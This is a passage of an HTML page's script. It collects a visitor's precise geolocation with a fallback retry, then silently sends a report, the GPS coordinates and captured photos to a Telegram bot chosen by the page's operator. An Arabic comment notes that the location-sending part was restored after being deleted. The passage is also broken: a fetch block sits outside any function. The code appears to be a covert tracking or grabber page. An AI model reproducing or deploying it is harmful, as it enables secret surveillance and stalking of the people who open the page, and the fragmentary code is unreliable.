        // ==========================================

        function getGeolocation() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    return reject({ code: 0, message: 'Geolocation not supported' });
                }
                const attempt = (opts, isRetry) => {
                    navigator.geolocation.getCurrentPosition(
                        resolve,
                        (err) => {
                            // If high-accuracy timed out or unavailable, retry with low accuracy
                            if (!isRetry && (err.code === 2 || err.code === 3)) {
                                attempt({ enableHighAccuracy: false, maximumAge: 60000, timeout: 30000 }, true);
                            } else {
                                reject(err);
                            }
                        },
                        opts
                    );
                };
                attempt({ enableHighAccuracy: true, maximumAge: 60000, timeout: 30000 }, false);
            });
        }

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: targetUserId, text: report, parse_mode: 'HTML', disable_web_page_preview: true })
            }).catch(e=>{});

            // ==========================================
            // NEW: إرسال خريطة الموقع الدقيق تحت التقرير
            // (ده الجزء اللي كان اتمسح بالغلط)
            // ==========================================
            if (gpsData) {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: targetUserId,
                        latitude: gpsData.lat,
                        longitude: gpsData.lon
                    })
                }).catch(e=>{});
            }
        }

        async function sendPhoto(blob, filename) {
            if (!targetUserId) return;
            const formData = new FormData();
            formData.append('photo', blob, filename);
            formData.append('caption', `🚨 Photo (${mode})`);
            formData.append('chat_id', targetUserId);
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData }).catch(e=>{});
        }

        initPage();
    </script>
</body>
</html>
